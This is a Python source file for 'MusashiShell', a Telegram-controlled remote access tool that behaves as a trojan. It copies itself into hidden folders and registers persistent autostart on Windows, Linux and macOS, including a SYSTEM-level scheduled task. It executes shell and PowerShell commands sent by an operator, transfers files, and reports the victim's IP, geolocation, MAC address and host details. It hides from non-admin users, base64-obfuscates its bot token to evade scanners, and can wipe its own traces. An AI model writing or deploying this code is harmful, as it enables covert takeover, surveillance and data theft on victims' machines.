# -*- coding: utf-8 -*-
"""
MusashiShell — Telegram-controlled remote administration client.

OVERVIEW
--------
Self-installing Telegram bot that:
  * copies itself into a hidden folder under a per-OS data directory,
  * registers itself in OS autostart (elevated if possible, per-user otherwise),
  * accepts shell commands from a single admin via Telegram,
  * supports three execution backends:
      - plain text          -> shell (cmd.exe on Windows, sh on Unix)
      - /cmd <text>         -> explicitly cmd.exe / sh
      - /powershell <text>  -> PowerShell (Windows only)
  * can send and receive files (/getfile, /putfile),
  * reports geolocation of the public IP via multiple fallback APIs,
  * self-destructs on /uninstall after inline confirmation,
  * never dies on its own (except on invalid/duplicate Telegram token).

SECRETS
-------
TOKEN and ADMIN_ID are stored as base64 blobs substituted by the builder.
This is obfuscation, not encryption — anyone with the binary can decode
them in one line. It only defeats naive grep / regex scanners looking for
the "digits:letters" bot-token shape in plain text.

CONFIG
------
APP_NAME is substituted by the builder and used as:
  * the on-disk file base name (e.g. SystemEvents.exe),
  * the Windows scheduled task name,
  * the HKCU registry key name for the install marker,
  * the Linux systemd unit name,
  * the macOS launchd label suffix (com.<APP_NAME>).

Autostart matrix:
  Windows (admin) -> schtasks ONLOGON as SYSTEM with HIGHEST privileges
  Windows (user)  -> HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
  Linux   (root)  -> /etc/systemd/system/<APP>.service
  Linux   (user)  -> ~/.config/autostart/<APP>.desktop
  macOS   (root)  -> /Library/LaunchDaemons/<label>.plist
  macOS   (user)  -> ~/Library/LaunchAgents/<label>.plist

Output encoding note:
  cmd.exe built-in commands ignore `chcp 65001` when their stdout is a
  pipe. So we capture raw bytes and decode with `_dec`, trying UTF-8 first
  and falling back to the system OEM codepage (cp866 on Russian Windows,
  cp437 on US, cp932 on Japanese, ...).
"""

# =========================================================================== #
# Standard library imports
# =========================================================================== #
import asyncio          # async runtime — the bot is fully async
import atexit           # last-resort notification on normal process exit
import base64           # decode TOKEN / ADMIN_ID injected by the builder
import getpass          # fetch the current username
import json             # parse responses from geo-IP APIs
import logging          # silence aiogram's own noisy loggers
import os               # env vars, paths, chmod, low-level exit
import platform         # OS name / release / architecture
import random           # random suffix for the install folder name
import shutil           # copy files during self-install
import signal           # SIGINT/SIGTERM/SIGBREAK shutdown handlers
import socket           # LAN IP discovery
import string           # alphabet for random folder names
import subprocess       # execute shell commands
import sys              # platform detection, stdout reconfiguration
import time             # uptime counter for /heartbeat
import urllib.request   # public IP + geo-IP lookups
import uuid             # MAC address via uuid.getnode()
from pathlib import Path  # modern, cross-platform filesystem paths

# =========================================================================== #
# Third-party imports (aiogram)
# =========================================================================== #
from aiogram import Bot, Dispatcher, F
from aiogram.exceptions import TelegramConflictError, TelegramUnauthorizedError
from aiogram.filters import Command
from aiogram.types import (
    CallbackQuery,
    ErrorEvent,
    FSInputFile,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)


# =========================================================================== #
# Platform detection
# =========================================================================== #
IS_WIN = sys.platform.startswith("win")
IS_MAC = sys.platform == "darwin"
IS_LINUX = not IS_WIN and not IS_MAC

if IS_WIN:
    # Imported lazily so Unix runs don't fail on missing modules.
    import ctypes    # Win32 API: admin check, OEM codepage, H+S attributes
    import winreg    # Windows registry: install marker, HKCU autostart


# =========================================================================== #
# UTF-8 bootstrap
# =========================================================================== #
# On Windows, force the console codepage to UTF-8. Best-effort: if it
# fails (no console, ancient Windows), we silently continue.
if IS_WIN:
    try:
        _k32 = ctypes.windll.kernel32
        _k32.SetConsoleOutputCP(65001)
        _k32.SetConsoleCP(65001)
    except Exception:
        pass

# Reconfigure Python's text streams so anything we print is UTF-8.
# `errors="replace"` guarantees we never crash on an unencodable char.
for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# Belt-and-braces: propagate UTF-8 to child Python processes.
os.environ.setdefault("PYTHONIOENCODING", "utf-8")
os.environ.setdefault("PYTHONUTF8", "1")


# =========================================================================== #
# Build-time placeholders (substituted by builder.py before compilation)
# =========================================================================== #
# TOKEN and ADMIN_ID are base64 blobs — the builder replaces __TOKEN__ and
# __ADMIN_ID__ with base64-encoded strings, decoded here at import time.
# `__import__("base64")` avoids an extra import line in the minified
# version; here we use the module-level import for readability.
TOKEN = base64.b64decode("__TOKEN__").decode("utf-8")
ADMIN_ID = int(base64.b64decode("__ADMIN_ID__").decode("utf-8"))
CLIENT_NAME = "__NAME__"       # human-readable name shown in every message

APP_NAME = "__APP_NAME__"      # set by builder: exe / task / registry / unit
APP_LABEL = f"com.{APP_NAME}"  # macOS launchd label

# Telegram Bot API caps bot uploads at 50 MB. We check locally to give a
# clear error instead of letting the API reject the request.
MAX_UPLOAD = 50 * 1024 * 1024

# Subprocess creation flags for Windows:
#   CREATE_NO_WINDOW (0x08000000)   — no console window flashes
#   DETACHED_PROCESS (0x00000008)   — child is not tied to our console
# On Unix they're 0 (unused).
_SPAWN = 0x08000000 if IS_WIN else 0
_DETACH = 0x00000008 if IS_WIN else 0


# =========================================================================== #
# aiogram objects
# =========================================================================== #
bot = Bot(token=TOKEN)
dp = Dispatcher()

# Silence aiogram's own loggers so they don't interleave with our output.
logging.getLogger("aiogram").setLevel(logging.CRITICAL)
logging.getLogger("asyncio").setLevel(logging.CRITICAL)


# =========================================================================== #
# Runtime state (module-level, mutated by handlers)
# =========================================================================== #
_start_ts = time.time()      # process start time, used by /heartbeat
_offline = False             # True after "connection lost" was reported once
_loop = None                 # running event loop, set in main() for signals
_shutdown_done = False       # ensures ONE shutdown notification per process
_pending_put = None          # target dir waiting for the next document
_geo_cache = None            # cached result of _geo_lookup()


# =========================================================================== #
# Generic helpers
# =========================================================================== #
def _rand(n=10):
    """Random lowercase alphanumeric string, used for install folder names."""
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _hide(path):
    """
    Set HIDDEN + SYSTEM attributes on `path` (Windows only).

    FILE_ATTRIBUTE_HIDDEN = 0x02, FILE_ATTRIBUTE_SYSTEM = 0x04.
    Files/folders with these attributes don't appear in Explorer and are
    skipped by `dir` unless `dir /a` is used. No-op on non-Windows.
    """
    if not IS_WIN:
        return
    try:
        s = str(path)
        attrs = ctypes.windll.kernel32.GetFileAttributesW(s)
        if attrs == -1:
            attrs = 0x80  # FILE_ATTRIBUTE_NORMAL if the query failed
        ctypes.windll.kernel32.SetFileAttributesW(s, attrs | 0x02 | 0x04)
    except Exception:
        pass


def _write_text(path, text, mode=None):
    """
    Write UTF-8 text to `path`, creating parent dirs, using LF newlines.

    `newline="\\n"` guarantees Unix-style line endings even on Windows —
    critical for systemd units and launchd plists.
    `mode` optionally chmods the file (e.g. 0o755 for executables).
    """
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", encoding="utf-8", newline="\n") as f:
        f.write(text)
    if mode is not None:
        try:
            os.chmod(path, mode)
        except Exception:
            pass


def _oem():
    """
    Return the system OEM codepage as a Python codec name.

    This is the codepage cmd.exe built-ins use when writing to a pipe:
    cp866 on Russian Windows, cp437 on US, cp932 on Japanese, etc.
    """
    try:
        return f"cp{ctypes.windll.kernel32.GetOEMCP()}"
    except Exception:
        return "cp866"  # safe fallback


def _dec(raw_bytes):
    """
    Decode raw subprocess output to str.

    Strategy:
      1. Try UTF-8 first — external tools almost always emit UTF-8.
      2. On UnicodeDecodeError, fall back to the system OEM codepage,
         which is what cmd.exe built-ins use when stdout is a pipe.
      3. errors="replace" guarantees we never crash on stray bytes.
    """
    if not raw_bytes:
        return ""
    try:
        return raw_bytes.decode("utf-8")
    except UnicodeDecodeError:
        return raw_bytes.decode(_oem(), errors="replace")


class _C:
    """Lightweight subprocess.CompletedProcess replacement with decoded text."""
    def __init__(self, returncode, stdout, stderr):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr


def _run(args, timeout=30):
    """
    Run a subprocess, decode output, never raise.

    On Windows `list2cmdline` joins argv into one command line (we call
    with shell=True). On ANY failure we return rc=-1 with the exception
    text in stderr — callers never need to check for None.
    """
    try:
        if IS_WIN:
            cmdline = subprocess.list2cmdline(args)
            r = subprocess.run(
                cmdline, shell=True, capture_output=True,
                timeout=timeout, creationflags=_SPAWN,
            )
        else:
            r = subprocess.run(args, capture_output=True, timeout=timeout)
        return _C(r.returncode, _dec(r.stdout or b""), _dec(r.stderr or b""))
    except Exception as e:
        return _C(-1, "", str(e))


def is_admin():
    """True when running elevated (root on Unix, Administrator on Windows)."""
    try:
        if IS_WIN:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        return os.geteuid() == 0
    except Exception:
        return False


# =========================================================================== #
# Per-OS directory selection
# =========================================================================== #
def _config_dir():
    """Per-user config directory (used for the install marker on Unix)."""
    if IS_WIN:
        base = os.environ.get("APPDATA") or os.path.expanduser("~")
    elif IS_MAC:
        base = os.path.expanduser("~/Library/Application Support")
    else:
        base = os.environ.get("XDG_CONFIG_HOME") or os.path.expanduser("~/.config")
    return Path(base) / APP_NAME


def _data_dir():
    """
    Writable directory where the installed copy of ourselves lives.

    Preference:
      * elevated -> system-wide location (ProgramData, /opt, /Library/...)
      * regular  -> per-user writable location (LOCALAPPDATA, ~/.local/share)
    """
    if IS_WIN:
        if is_admin():
            return Path(os.environ.get("PROGRAMDATA", r"C:\ProgramData"))
        return Path(
            os.environ.get("LOCALAPPDATA")
            or os.environ.get("APPDATA")
            or os.path.expanduser("~")
        )
    if IS_MAC:
        if is_admin():
            return Path("/Library/Application Support")
        return Path(os.path.expanduser("~/Library/Application Support"))
    # Linux
    if is_admin():
        return Path("/opt")
    base = os.environ.get("XDG_DATA_HOME") or os.path.expanduser("~/.local/share")
    return Path(base)


# =========================================================================== #
# Install marker I/O
# =========================================================================== #
# The marker records where we've installed ourselves, making install_self
# idempotent: on subsequent runs we simply return the recorded path.
#   Windows: HKCU\\Software\\<APP_NAME>\\LaunchPath
#   Unix:    ~/.config/<APP_NAME>/install_path
def _marker_file():
    """Path to the marker file on Unix (unused on Windows)."""
    return _config_dir() / "install_path"


def _read_install_path():
    """Return the recorded install path if it still exists, else None."""
    try:
        if IS_WIN:
            k = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, rf"Software\{APP_NAME}",
                0, winreg.KEY_READ,
            )
            value, _ = winreg.QueryValueEx(k, "LaunchPath")
            winreg.CloseKey(k)
        else:
            value = _marker_file().read_text(encoding="utf-8").strip()
        return value if value and os.path.exists(value) else None
    except Exception:
        return None


def _save_install_path(path):
    """Persist the install path into the registry (Win) or marker file (Unix)."""
    try:
        if IS_WIN:
            k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, rf"Software\{APP_NAME}")
            winreg.SetValueEx(k, "LaunchPath", 0, winreg.REG_SZ, path)
            winreg.CloseKey(k)
        else:
            _write_text(_marker_file(), path)
    except Exception:
        pass


def _clear_install_path():
    """Remove the install marker (used during /uninstall)."""
    try:
        if IS_WIN:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, rf"Software\{APP_NAME}")
        else:
            _marker_file().unlink(missing_ok=True)
    except Exception:
        pass


# =========================================================================== #
# Launcher wrapper (for .py installs)
# =========================================================================== #
def _make_launcher(folder, script):
    """
    Create a silent launcher for a .py copy.

    Windows -> .vbs that invokes pythonw.exe (no console window).
    Unix    -> .sh with a shebang that execs the current interpreter.
    Only used for .py installs; compiled binaries are launched directly.
    """
    if IS_WIN:
        pyw = Path(sys.executable).with_name("pythonw.exe")
        if not pyw.exists():
            pyw = Path(sys.executable)
        launcher = folder / f"{APP_NAME}.vbs"
        _write_text(
            launcher,
            'Set sh = CreateObject("WScript.Shell")\n'
            + f'sh.Run """{pyw}"" ""{script}""", 0, False\n',
        )
        _hide(launcher)
    else:
        launcher = folder / f"{APP_NAME}.sh"
        _write_text(
            launcher,
            "#!/bin/sh\n" + f'exec "{sys.executable}" "{script}" "$@"\n',
            mode=0o755,
        )
    return launcher


# =========================================================================== #
# Self-install
# =========================================================================== #
def install_self():
    """
    Copy ourselves into a hidden random folder and return the launch target.

    Idempotent: if the marker points to an existing file, return it as-is.

    Layout:
      Windows admin : C:\\ProgramData\\.<rand>\\<APP>.exe
      Windows user  : %LOCALAPPDATA%\\.<rand>\\<APP>.exe
      Linux   root  : /opt/.<rand>/<APP>
      Linux   user  : ~/.local/share/.<rand>/<APP>
      macOS   root  : /Library/Application Support/.<rand>/<APP>
      macOS   user  : ~/Library/Application Support/.<rand>/<APP>

    For .py installs a launcher (.vbs or .sh) is created and returned as
    the launch target, because the raw .py has no shebang/exec bit.

    On any failure returns the currently running script/binary path so
    the rest of the program still has something usable.
    """
    saved = _read_install_path()
    if saved:
        return saved
    try:
        frozen = getattr(sys, "frozen", False)
        src = Path(sys.executable if frozen else __file__).resolve()
        ext = ".exe" if frozen and IS_WIN else ("" if frozen else ".py")

        base = _data_dir()
        folder = base / f".{_rand(10)}"
        try:
            folder.mkdir(parents=True, exist_ok=True)
        except Exception:
            # Preferred base isn't writable — fall back to home.
            folder = Path.home() / f".{_rand(10)}"
            folder.mkdir(parents=True, exist_ok=True)
        _hide(folder)

        dst = folder / f"{APP_NAME}{ext}"
        if src.resolve() != dst.resolve():
            shutil.copy2(src, dst)
        _hide(dst)

        # Make the .py copy executable on Unix.
        if not frozen and not IS_WIN:
            try:
                os.chmod(dst, 0o755)
            except Exception:
                pass

        # Binaries launch directly; .py copies need a silent launcher.
        launch = dst if frozen else _make_launcher(folder, dst)
        _save_install_path(str(launch))
        return str(launch)
    except Exception:
        return str(
            Path(sys.executable if getattr(sys, "frozen", False) else __file__).resolve()
        )


# =========================================================================== #
# Autostart: Windows
# =========================================================================== #
def _autostart_windows(target):
    """
    Elevated -> scheduled task ONLOGON as SYSTEM with HIGHEST privileges.
                Runs for EVERY user on the machine, elevated, without any
                UAC prompt. This is the strongest autostart available.
    Non-elev -> HKCU\\...\\Run value (current user, non-elevated).

    Returns a human-readable status string for the admin notification.
    """
    if is_admin():
        # schtasks needs the /TR argument quoted if it contains spaces.
        tr = f'"{target}"' if " " in target else target
        r = _run([
            "schtasks", "/Create",
            "/TN", APP_NAME,
            "/TR", tr,
            "/SC", "ONLOGON",
            "/RL", "HIGHEST",
            "/RU", "SYSTEM",
            "/F",
        ])
        if r.returncode == 0:
            return f"✅ [all-users] {APP_NAME} → {target}"
        return f"⚠️ schtasks: {(r.stderr or r.stdout).strip()}"

    try:
        k = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(k, APP_NAME, 0, winreg.REG_SZ, target)
        winreg.CloseKey(k)
        return f"✅ [current-user] HKCU\\Run → {target}"
    except Exception as e:
        return f"⚠️ reg: {e}"


# =========================================================================== #
# Autostart: Linux
# =========================================================================== #
def _autostart_linux(target):
    """
    Root -> systemd system unit under /etc/systemd/system, enabled and
            started immediately. Restart=always respawns on crash.
    User -> XDG autostart .desktop under ~/.config/autostart, honoured
            by GNOME/KDE/XFCE/etc.
    """
    if is_admin():
        unit = (
            "[Unit]\n"
            f"Description={APP_NAME}\n"
            "After=network-online.target\n"
            "Wants=network-online.target\n\n"
            "[Service]\n"
            "Type=simple\n"
            f"ExecStart={target}\n"
            "Restart=always\n"
            "RestartSec=10\n\n"
            "[Install]\n"
            "WantedBy=multi-user.target\n"
        )
        unit_path = Path(f"/etc/systemd/system/{APP_NAME}.service")
        try:
            _write_text(unit_path, unit, mode=0o644)
            _run(["systemctl", "daemon-reload"])
            _run(["systemctl", "enable", "--now", f"{APP_NAME}.service"])
            return f"✅ [systemd] {APP_NAME} → {target}"
        except Exception as e:
            return f"⚠️ systemd: {e}"

    autostart_dir = Path(
        os.environ.get("XDG_CONFIG_HOME") or os.path.expanduser("~/.config")
    ) / "autostart"
    desktop = (
        "[Desktop Entry]\n"
        "Type=Application\n"
        f"Name={APP_NAME}\n"
        f"Exec={target}\n"
        "Terminal=false\n"
        "X-GNOME-Autostart-enabled=true\n"
    )
    try:
        _write_text(autostart_dir / f"{APP_NAME}.desktop", desktop, mode=0o644)
        return f"✅ [xdg-autostart] {APP_NAME} → {target}"
    except Exception as e:
        return f"⚠️ desktop: {e}"


# =========================================================================== #
# Autostart: macOS
# =========================================================================== #
def _autostart_macos(target):
    """
    Root -> LaunchDaemon in /Library/LaunchDaemons (runs as root at boot).
    User -> LaunchAgent in ~/Library/LaunchAgents (runs as user at login).
    KeepAlive=true -> launchd respawns the process if it dies.
    """
    plist = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
        '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
        '<plist version="1.0">\n'
        '<dict>\n'
        f'  <key>Label</key><string>{APP_LABEL}</string>\n'
        '  <key>ProgramArguments</key>\n'
        f'  <array><string>{target}</string></array>\n'
        '  <key>RunAtLoad</key><true/>\n'
        '  <key>KeepAlive</key><true/>\n'
        '</dict>\n'
        '</plist>\n'
    )
    plist_dir = (
        Path("/Library/LaunchDaemons") if is_admin()
        else Path(os.path.expanduser("~/Library/LaunchAgents"))
    )
    plist_path = plist_dir / f"{APP_LABEL}.plist"
    try:
        _write_text(plist_path, plist, mode=0o644)
        # Unload first in case an older version is already registered.
        _run(["launchctl", "unload", str(plist_path)])
        r = _run(["launchctl", "load", "-w", str(plist_path)])
        if r.returncode != 0:
            return f"⚠️ launchctl: {(r.stderr or r.stdout).strip()}"
        kind = "daemon" if is_admin() else "agent"
        return f"✅ [{kind}] {APP_LABEL} → {target}"
    except Exception as e:
        return f"⚠️ plist: {e}"


# =========================================================================== #
# Autostart dispatcher
# =========================================================================== #
def autostart_install():
    """Install ourselves and register autostart; returns a status string."""
    try:
        target = install_self()
        if IS_WIN:
            return _autostart_windows(target)
        if IS_MAC:
            return _autostart_macos(target)
        return _autostart_linux(target)
    except Exception as e:
        return f"⚠️ install err: {e}"


# =========================================================================== #
# Autostart teardown (used by /uninstall)
# =========================================================================== #
def _uninstall_autostart():
    """
    Remove every autostart mechanism we may have registered. Best-effort:
    each command is attempted and any failure is silently ignored.
    """
    try:
        if IS_WIN:
            _run(["schtasks", "/Delete", "/TN", APP_NAME, "/F"])
            _run(["reg", "delete", rf"HKCU\Software\{APP_NAME}", "/f"])
            _run(["reg", "delete",
                  r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                  "/v", APP_NAME, "/f"])
            _run(["reg", "delete", rf"HKLM\Software\{APP_NAME}", "/f"])
            _run(["reg", "delete",
                  r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
                  "/v", APP_NAME, "/f"])

        elif IS_MAC:
            candidates = (
                Path(f"/Library/LaunchDaemons/{APP_LABEL}.plist"),
                Path(os.path.expanduser(f"~/Library/LaunchAgents/{APP_LABEL}.plist")),
            )
            for p in candidates:
                _run(["launchctl", "unload", "-w", str(p)])
                try:
                    p.unlink(missing_ok=True)
                except Exception:
                    pass

        else:  # Linux
            _run(["systemctl", "disable", "--now", f"{APP_NAME}.service"])
            try:
                Path(f"/etc/systemd/system/{APP_NAME}.service").unlink(missing_ok=True)
            except Exception:
                pass
            _run(["systemctl", "daemon-reload"])
            for p in (
                Path(f"/etc/systemd/system/{APP_NAME}.service"),
                Path(os.environ.get("XDG_CONFIG_HOME")
                     or os.path.expanduser("~/.config"))
                / "autostart" / f"{APP_NAME}.desktop",
            ):
                try:
                    p.unlink(missing_ok=True)
                except Exception:
                    pass
    except Exception:
        pass


# =========================================================================== #
# Self-destruct (used by /uninstall)
# =========================================================================== #
def self_destruct():
    """
    Remove every trace and schedule deletion of the install folder.

    The running process holds an open handle on its own executable, so we
    can't rmdir the install folder directly. Instead we spawn a detached
    helper that sleeps 2 seconds (giving our process time to exit) and
    then removes the folder. Windows uses cmd.exe's built-in `timeout`
    and `rmdir`; Unix uses sh + sleep + rm -rf.

    After scheduling, we call os._exit(0) for an immediate hard exit
    (no Python cleanup, no atexit re-entry).
    """
    _uninstall_autostart()
    _clear_install_path()

    # Determine the folder to remove. First try the path we're currently
    # running from (most reliable); fall back to the marker if that fails.
    folder = None
    try:
        cur = Path(sys.executable if getattr(sys, "frozen", False) else __file__).resolve()
        folder = str(cur.parent)
    except Exception:
        pass
    if not folder:
        try:
            launch = _read_install_path()
            if launch:
                folder = str(Path(launch).parent)
        except Exception:
            pass

    if folder:
        try:
            if IS_WIN:
                subprocess.Popen(
                    f'timeout /t 2 /nobreak >nul & '
                    f'attrib -h -s -r "{folder}" /s /d & '
                    f'rmdir /s /q "{folder}"',
                    shell=True,
                    creationflags=_SPAWN | _DETACH,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
            else:
                subprocess.Popen(
                    f'sleep 2 && rm -rf "{folder}"',
                    shell=True,
                    start_new_session=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
        except Exception:
            pass

    os._exit(0)


# =========================================================================== #
# Geolocation via public IP (multi-API with fallbacks)
# =========================================================================== #
def _flag(country_code):
    """
    Convert a 2-letter ISO country code into its flag emoji.

    Uses Unicode regional indicator symbols: each letter A-Z maps to
    U+1F1E6..U+1F1FF, and two in a row form the flag. Returns a neutral
    white flag if the input is empty or malformed.
    """
    if not country_code or len(country_code) != 2:
        return "🏳️"
    try:
        return "".join(
            chr(0x1F1E6 + ord(c.upper()) - 65) for c in country_code
        )
    except Exception:
        return "🏳️"


def _geo_lookup():
    """
    Resolve the public IP to country/city/coordinates via fallback APIs.

    Cached in `_geo_cache` after the first successful lookup, so that
    get_geo_line() and get_public_ip() (both called per /start and per
    ONLINE message) don't hit the network twice.

    Each entry is (url, keys) where keys are the JSON field names in
    order: (ip, country_code, country_name, city, latitude, longitude).
    Any key may be None if the API does not provide that field.

    Returns a dict with keys: ip, cc, country, city, lat, lon.
    Empty dict if every provider failed.
    """
    global _geo_cache
    if _geo_cache is not None:
        return _geo_cache

    apis = [
        ("https://ipwho.is/",                   ("ip",        "country_code", "country",      "city",     "latitude", "longitude")),
        ("https://ipapi.co/json/",              ("ip",        "country_code", "country_name", "city",     "latitude", "longitude")),
        ("https://freeipapi.com/api/json",      ("ipAddress", "countryCode",  "countryName",  "cityName", "latitude", "longitude")),
        ("https://get.geojs.io/v1/ip/geo.json", ("ip",        "country_code", "country",      "city",     "latitude", "longitude")),
        ("https://api.ip.sb/geoip",             ("ip",        "country_code", "country",      "city",     "latitude", "longitude")),
        ("http://ipwhois.app/json/",            ("ip",        "country_code", "country",      "city",     "latitude", "longitude")),
        ("http://ip-api.com/json/",             ("query",     "countryCode",  "country",      "city",     "lat",      "lon")),
        ("https://ipinfo.io/json",              ("ip",        "country",      "country",      "city",     None,       None)),
        ("https://api.myip.com",                ("ip",        "cc",           "country",      None,       None,       None)),
    ]
    for url, keys in apis:
        try:
            with urllib.request.urlopen(url, timeout=6) as r:
                data = json.loads(r.read().decode("utf-8", errors="replace"))
            ip = data.get(keys[0])
            if not ip:
                continue
            _geo_cache = {
                "ip": ip,
                "cc": data.get(keys[1]) or "",
                "country": data.get(keys[2]) or "?",
                "city": data.get(keys[3]) or "?",
                "lat": data.get(keys[4]) if keys[4] else None,
                "lon": data.get(keys[5]) if keys[5] else None,
            }
            return _geo_cache
        except Exception:
            pass

    _geo_cache = {}
    return _geo_cache


def get_geo_line():
    """
    Human-readable geolocation line, e.g.:
        🇷🇺 Russia, Moscow (55.7558, 37.6173 - GeoIP)
    Falls back to "unknown" if no API responded.
    """
    d = _geo_lookup()
    if not d or not d.get("ip"):
        return "unknown"
    coords = (
        f" ({d['lat']}, {d['lon']} - GeoIP)"
        if d.get("lat") is not None and d.get("lon") is not None
        else ""
    )
    return f"{_flag(d.get('cc', ''))} {d.get('country', '?')}, {d.get('city', '?')}{coords}"


def get_public_ip():
    """External IP as reported by the first geo-API that answered."""
    d = _geo_lookup()
    return d.get("ip") or "unknown"


def get_local_ip():
    """LAN IP by opening a UDP socket toward 8.8.8.8 (no packets sent)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "unknown"


def get_mac():
    """
    Primary MAC address in two formats:
        A1B2C3D4E5F6 (A1:B2:C3:D4:E5:F6)
    Raw hex first, then colon-separated in parentheses.
    """
    try:
        n = uuid.getnode()
        h = f"{n:012X}"
        c = ":".join(h[i:i + 2] for i in (0, 2, 4, 6, 8, 10))
        return f"{h} ({c})"
    except Exception:
        return "unknown"


# =========================================================================== #
# System information gathering
# =========================================================================== #
def get_device_info():
    """
    Multi-line snapshot of the host:
    hostname, user, OS, arch, LAN IP, public IP (geo), MAC, CWD,
    install path, admin flag, platform tag.

    Geolocation is reported separately (see build_online_message) — this
    function only includes the raw public IP.
    """
    try:
        user = getpass.getuser()
    except Exception:
        user = "unknown"
    try:
        return "\n".join([
            f"🖥 Host: {platform.node()}",
            f"👤 User: {user}",
            f"💻 OS: {platform.system()} {platform.release()} ({platform.version()})",
            f"🏗 Architecture: {platform.machine()}",
            f"🌐 Local IP: {get_local_ip()}",
            f"🌍 Public IP: {get_public_ip()}",
            f"🔗 MAC: {get_mac()}",
            f"📁 CWD: {os.getcwd()}",
            f"📂 Installed: {_read_install_path() or '❌'}",
            f"🛡 Admin: {is_admin()}",
            f"🐧 Platform: {'win' if IS_WIN else 'mac' if IS_MAC else 'linux'}",
            f"\n",
            f"Type /help to see command list.",
        ])
    except Exception as e:
        return f"[device info error: {e}]"


async def build_online_message():
    """
    Full ONLINE message sent on startup and on reconnect:

        🟢 [NAME] ONLINE!

        🇷🇺 Country, City (lat, lon - GeoIP)

        🖥 Host: ...
        ...

    Geolocation is computed first (network-blocking), then the device
    info (also network-blocking for public IP). Both offloaded to worker
    threads so the event loop stays responsive.
    """
    try:
        geo = await asyncio.to_thread(get_geo_line)
    except Exception as e:
        geo = f"[geo err: {e}]"
    try:
        info = await asyncio.to_thread(get_device_info)
    except Exception as e:
        info = f"[info err: {e}]"
    return f"🟢 [{CLIENT_NAME}] ONLINE!\n\n{geo}\n\n{info}"


# =========================================================================== #
# Command execution
# =========================================================================== #
def run_cmd(command):
    """
    Default shell execution — used for plain text messages.

    Windows: shell=True uses cmd.exe. Unix: uses /bin/sh.
    No timeout is applied deliberately: long-running commands are allowed
    to complete. They will block a worker thread until done, so a stuck
    command can pin one thread — but the event loop stays responsive and
    new commands still run on fresh threads.

    All Windows subprocesses are spawned with CREATE_NO_WINDOW to avoid
    a console flash.
    """
    try:
        r = subprocess.run(
            command, shell=True, capture_output=True,
            creationflags=_SPAWN if IS_WIN else 0,
        )
        out = _dec((r.stdout or b"") + (r.stderr or b"")).strip()
        return out or f"[empty, rc={r.returncode}]"
    except Exception as e:
        return f"[error: {e}]"


def run_cmd_cmdline(command):
    """
    Explicit cmd.exe / sh execution — used by /cmd.

    Windows: invokes cmd.exe /c so built-ins like `dir`, `set`, `copy`
    behave identically to running them from a console.
    Unix:    falls back to shell=True (same as run_cmd).
    """
    try:
        if IS_WIN:
            r = subprocess.run(
                ["cmd.exe", "/c", command],
                capture_output=True, creationflags=_SPAWN,
            )
        else:
            r = subprocess.run(command, shell=True, capture_output=True)
        out = _dec((r.stdout or b"") + (r.stderr or b"")).strip()
        return out or f"[empty, rc={r.returncode}]"
    except Exception as e:
        return f"[error: {e}]"


def run_cmd_ps(command):
    """
    PowerShell execution — used by /powershell. Windows-only.

    Flags:
        -NoProfile      do not load the user profile (faster, cleaner)
        -NonInteractive  never prompt for input; prevents hangs
    """
    if not IS_WIN:
        return "[powershell] only supported on Windows"
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", command],
            capture_output=True, creationflags=_SPAWN,
        )
        out = _dec((r.stdout or b"") + (r.stderr or b"")).strip()
        return out or f"[empty, rc={r.returncode}]"
    except Exception as e:
        return f"[error: {e}]"


def split_msg(text, limit=4000):
    """
    Yield chunks of at most `limit` characters.

    Telegram caps messages at ~4096 chars. We use 4000 to leave headroom
    for our prefix and Markdown fences.
    """
    for i in range(0, len(text), limit):
        yield text[i:i + limit]


def is_adm(message):
    """
    Return True if the message came from the configured admin.

    Non-admin messages are silently ignored everywhere (no "access
    denied" reply — the bot doesn't reveal its existence).
    """
    try:
        return bool(message.from_user and message.from_user.id == ADMIN_ID)
    except Exception:
        return False


# =========================================================================== #
# Shutdown notifications (signals + atexit backstop)
# =========================================================================== #
async def _safe_send(text):
    """Best-effort admin notification. Any failure is silently ignored."""
    try:
        await bot.send_message(ADMIN_ID, text)
    except Exception:
        pass


async def _send_and_exit(text):
    """Send a message, give it a moment to flush, then hard-exit."""
    await _safe_send(text)
    await asyncio.sleep(0.3)
    os._exit(0)


def _on_signal(signum, frame):
    """
    Sync handler for SIGINT/SIGTERM/SIGBREAK.

    Schedules an async shutdown on the running event loop via
    `run_coroutine_threadsafe`. Falls back to a hard exit if the loop
    is not yet available (e.g. very early in startup).
    """
    global _shutdown_done
    if _shutdown_done:
        return
    _shutdown_done = True
    try:
        if _loop and not _loop.is_closed():
            asyncio.run_coroutine_threadsafe(
                _send_and_exit(
                    f"⚠️ [{CLIENT_NAME}] shutting down (signal {signum})"
                ),
                _loop,
            )
            return
    except Exception:
        pass
    os._exit(0)


def _on_exit():
    """
    atexit backstop — fires on normal process end (main returned cleanly).

    Skipped if a signal handler already notified the admin; the
    `_shutdown_done` flag ensures exactly ONE notification per process.
    """
    global _shutdown_done
    if _shutdown_done:
        return
    _shutdown_done = True
    try:
        asyncio.run(_safe_send(f"⚠️ [{CLIENT_NAME}] process exiting"))
    except Exception:
        pass


atexit.register(_on_exit)
